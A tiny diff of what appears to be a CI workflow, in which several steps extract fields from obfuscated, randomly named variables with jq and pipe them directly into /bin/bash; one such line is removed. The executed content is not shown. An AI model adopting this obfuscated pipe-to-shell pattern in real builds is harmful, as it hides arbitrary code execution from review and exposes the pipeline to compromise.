@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$deir002" | jq -r .sjum16251 | /bin/bash
           echo $yqnc4 | jq -r .ba137 | /bin/bash
           echo $qmq50 | jq -r .jhjr97440 | /bin/bash
-          printf '%s' "$crfsf76140" | jq -r .cifvh1529 | /bin/bash
           echo $tpop045 | jq -r .nb2836 | /bin/bash
 
       - name: Upload artifact
